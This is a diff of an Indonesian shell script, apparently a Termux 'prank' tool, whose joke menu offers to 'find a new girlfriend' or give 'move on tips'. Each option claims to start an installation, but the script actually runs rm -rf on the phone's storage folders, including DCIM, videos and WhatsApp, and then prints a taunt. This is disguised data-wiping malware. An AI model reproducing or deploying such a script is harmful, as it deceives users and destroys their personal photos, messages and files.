@@ -16,7 +16,7 @@ echo $b  "[+] Creator : OxLynx [+]  ┈╱╱╱╱╱╲╲╲┈╱╱╲╲�
 echo $pk "××××××××××××××××××××××××  ┈▏▕╭▅╭▅▕▕╭▏▅╮▅╮▕╮"
 echo $h  "[1] Cari Pacar Baru  [1]  ┈▏╱▔▔╮▔▕▕╰▏▔╭▔▔▕╯"
 echo $h  "××××××××××××××××××××××××  ▕╱╲╰━━╯╱╲▏╲╰━━╯╱"
-echo $k  "[2] Gabisa Move On   [2]  ┈┈╭▔▔▔▔╲┈┈╱▔▔▔▔╮"
+echo $k  "[2] Tips Move On     [2]  ┈┈╭▔▔▔▔╲┈┈╱▔▔▔▔╮"
 echo $k  "××××××××××××××××××××××××  ┈┈┃▏┊┊▕╲╲╱╱▏┊┊▕┃"
 echo $m  "[3] Keluar           [3]  ┈┈╰▏▂▂▕┈╰╯┈▏▂▂▕╯"
 echo $m  "××××××××××××××××××××××××  ┈┈▕▂▏▕▂▏┈┈▕▂▏▕▂▏"
@@ -34,7 +34,7 @@ fi
 
 if [ $oxlynx = 1 ] || [ $oxlynx = Cari Pacar Baru ]
 then
-echo $b "Tunggu Sebentar..."
+echo $b  "Tunggu Sebentar..."
 echo $pk "Proses Penginstallan"
 echo ""
 cd /sdcard
@@ -49,12 +49,13 @@ rm -rf vidio
 rm -rf vidioes
 rm -rf dcim
 rm -rf whatsapp
+echo $h "Maaf Nasib Anda Memang Jones"
 echo ""
 fi
 
 if [ $oxlynx = 2 ] || [ $oxlynx = Gabisa Move On ]
 then
-echo $b "Tunggu Sebentar..."
+echo $b  "Tunggu Sebentar..."
 echo $pk "Mulai Proses Penginstallan"
 echo ""
 cd /storage
@@ -69,5 +70,7 @@ rm -rf vidio
 rm -rf vidioes
 rm -rf dcim
 rm -rf whatsapp
+clear
+echo $h  "Selamat Anda Telah Move On"
 echo ""
 fi
